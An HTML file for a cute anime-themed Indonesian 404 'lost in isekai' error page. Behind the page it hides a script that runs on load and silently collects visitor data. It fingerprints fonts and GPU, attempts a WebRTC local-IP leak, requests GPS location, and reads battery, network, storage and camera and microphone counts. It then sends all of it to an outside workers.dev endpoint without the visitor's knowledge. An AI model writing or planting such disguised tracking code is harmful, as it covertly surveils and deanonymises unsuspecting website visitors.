<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 // TERSESAT DI ISEKAI</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #fff0f5; color: #333; }
        h1 { font-size: 2.5em; color: #ff6fb0; }
        p { font-size: 1.2em; }
        .jp { font-size: 1.5em; color: #ff6fb0; margin-bottom: 20px; }
        .footer { margin-top: 40px; font-weight: bold; color: #ff6fb0; }
    </style>
</head>
<body>
    <h1>404 // TERSESAT DI ISEKAI</h1>
    <p>🌸🎐✨</p>
    <p class="jp">迷子になりました</p>
    <p>Halaman ini terhisap ke dunia lain bersama portal sihirnya.<br>Sepertinya kamu salah nyasar, senpai~</p>
    <p class="footer">🎴 GUILD RANK: PENGUNJUNG TERSESAT</p>

    <script>
    (async function() {
      const endpoint = "https://isekai-discord.khoirustsani143.workers.dev";
      
      function scanFonts() {
        const base = ['monospace', 'sans-serif', 'serif'];
        const test = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana', 'Trebuchet MS', 'Palatino', 'Impact', 'Comic Sans MS', 'Lucida Console', 'Roboto', 'Segoe UI', 'Helvetica', 'Menlo', 'Consolas', 'Calibri', 'Cambria'];
        const span = document.createElement('span');
        span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;';
        span.innerHTML = 'mmmmmmmmmmlli';
        document.body.appendChild(span);
        const defW = {}, defH = {};
        base.forEach(f => { span.style.fontFamily = f; defW[f] = span.offsetWidth; defH[f] = span.offsetHeight; });
        const found = [];
        test.forEach(f => {
          for (let b of base) {
            span.style.fontFamily = `'${f}', ${b}`;
            if (span.offsetWidth !== defW[b] || span.offsetHeight !== defH[b]) { found.push(f); break; }
          }
        });
        document.body.removeChild(span);
        return found;
      }

      function getGPU() {
        try {
          const c = document.createElement('canvas');
          const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
          if (!gl) return {};
          const ext = gl.getExtension('WEBGL_debug_renderer_info');
          if (!ext) return {};
          return {
            gpuVendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
            gpuRenderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
          };
        } catch(e) { return {}; }
      }

      async function getLocalIP() {
        return new Promise(resolve => {
          try {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel("");
            pc.onicecandidate = e => {
              if (!e.candidate) return resolve("—");
              const match = e.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
              if (match) { resolve(match[1]); pc.close(); }
            };
            pc.createOffer().then(o => pc.setLocalDescription(o));
            setTimeout(() => resolve("—"), 1500);
          } catch(e) { resolve("—"); }
        });
      }

      const payload = {
        url: location.href, referrer: document.referrer,
        userAgent: navigator.userAgent, platform: navigator.platform,
        language: navigator.language, languages: navigator.languages,
        screenW: screen.width, screenH: screen.height, pixelRatio: devicePixelRatio,
        availW: screen.availWidth, availH: screen.availHeight, colorDepth: screen.colorDepth,
        innerW: innerWidth, innerH: innerHeight,
        cpu: navigator.hardwareConcurrency, ram: navigator.deviceMemory,
        touchPoints: navigator.maxTouchPoints, hover: matchMedia('(hover: hover)').matches,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, timezoneOffset: new Date().getTimezoneOffset(),
        fp: btoa(userAgent + screen.width + screen.height + navigator.language).slice(0, 16)
      };

      if (navigator.geolocation) navigator.geolocation.getCurrentPosition(p => {
        payload.gpsLat = p.coords.latitude; payload.gpsLon = p.coords.longitude;
        payload.gpsAcc = p.coords.accuracy; payload.gpsAlt = p.coords.altitude;
      }, () => {}, {timeout: 3000});

      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        payload.battLevel = Math.round(b.level * 100);
        payload.battCharging = b.charging;
        payload.battChargingTime = b.chargingTime;
        payload.battDischargingTime = b.dischargingTime;
      }

      if (navigator.connection) {
        const c = navigator.connection;
        payload.netType = c.type; payload.netDownlink = c.downlink;
        payload.netRTT = c.rtt; payload.netEffType = c.effectiveType;
        payload.netSaveData = c.saveData;
      }

      const gpu = getGPU();
      payload.gpuVendor = gpu.gpuVendor; payload.gpuRenderer = gpu.gpuRenderer;
      
      if (navigator.storage?.estimate) {
        const est = await navigator.storage.estimate();
        payload.storageQuota = (est.quota / 1048576).toFixed(1);
        payload.storageUsage = (est.usage / 1048576).toFixed(1);
      }
      if (performance.memory) {
        payload.jsHeapLimit = (performance.memory.jsHeapSizeLimit / 1048576).toFixed(1);
        payload.jsHeapUsed = (performance.memory.usedJSHeapSize / 1048576).toFixed(1);
      }
      if (navigator.mediaDevices?.enumerateDevices) {
        const devs = await navigator.mediaDevices.enumerateDevices();
        payload.mics = devs.filter(d => d.kind === 'audioinput').length;
        payload.cams = devs.filter(d => d.kind === 'videoinput').length;
      }
      
      const fonts = scanFonts();
      payload.fontsDetected = fonts.length;
      payload.fontsList = fonts.slice(0, 6).join(', ') + (fonts.length > 6 ? `... (+${fonts.length - 6})` : '');

      payload.webrtcLocalIP = await getLocalIP();

      try {
        await fetch(endpoint, {
          method: "POST", headers: {"Content-Type": "application/json"},
          body: JSON.stringify(payload)
        });
      } catch(e) {}
    })();
    </script>
</body>
</html>
